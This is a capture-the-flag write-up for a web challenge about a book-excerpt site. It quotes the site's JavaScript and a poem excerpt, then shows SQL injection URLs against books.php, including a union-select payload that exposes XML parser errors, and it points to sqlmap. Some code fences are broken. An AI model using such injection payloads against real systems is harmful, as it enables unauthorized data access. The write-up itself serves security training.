Challenge

A Cultural Treasury
https://poems.asisctf.com/

Solution
The website contains a list of books with two actions available:
* an excerpt to read an excerpt of the book;
* read online which opens a link from another domain, not related to the challenge.
Analyzing the HTML source of the page a treasury.js file can be found; it is interesting to understand performed calls.
```javascript
async function anexcerpt(book) {
  const modalEl = document.createElement('div');
  modalEl.style.width = '70%';
  modalEl.style.height = '50%';
  modalEl.style.margin = '100px auto';
  modalEl.style.backgroundColor = '#fff';
  modalEl.className = 'mui-panel';
  const header = document.createElement('h2');
  header.appendChild(document.createTextNode("An Excerpt From " + book.name));
  modalEl.appendChild(header);
  const loading = createSpinner(modalEl);
  // show modal
  mui.overlay('on', modalEl);
const response = await fetch('books.php?type=excerpt&id=' + book.id);
  const bookExcerpt = await response.text();
  const txtHolder = document.createElement('div');
  txtHolder.className = 'mui-textfield mui--z2'
  const txt = document.createElement('textarea');
  txt.appendChild(document.createTextNode(bookExcerpt));
  txt.readOnly = true;
  txt.style.height = "100%";
  txtHolder.appendChild(txt);
  txtHolder.style.height = "70%";
  loading.stop();
  modalEl.appendChild(txtHolder);
}
function readonline(book) {
  window.open(book.link);
}
```
The home page is created with the following request.
```

The excerpt button performs a request like the following.

Joseph will come back to Canaan again, 
My house the fragrance of her rose-garden will regain.
0 sad heart, from hardships do not get mad,
Your worries will soon end- don’t feel so sad.
If the Spring on turf-throne would remain,
The bird under flower-canopy sits again.
If the world turns to your favor some days,
Take it easy; it won’t do so always.
If God’s secrets are unknown don’t despair.
Behind the mystery-curtain is a love-affair.
O’Heart, if death-flood sweeps off all life,
Your pilot as Noah, ends your strife.
When through desert you pass for pilgrimage,
If thorns bother your feet, don’t be in rage.
The road’s perilous and destination away.
Yet all roads have their ends, I daresay.
Enemies oppose me in absence of friend,
God knows that on Him I only depend.
Hafiz, the dark, lonely nights never mind, 
Study and pray- thus salvation you find.

```
The read online button simply opens a window redirecting to the link specified for the book.
A URL like the following will reveal that web application is vulnerable to SQL injection, because the result of the book with id=1 will be printed.

https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271

The following URL will spawn a weird error.
```
https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23
Warning: simplexmlloadstring(): Entity: line 1: parser error : Start tag expected, '<' not found in /code/books.php on line 54
Warning: simplexmlloadstring(): 1 in /code/books.php on line 54
Warning: simplexmlloadstring(): ^ in /code/books.php on line 54
```
It seems that the web application reads XML from a database.
You could use sqlmap to retrieve information.
```
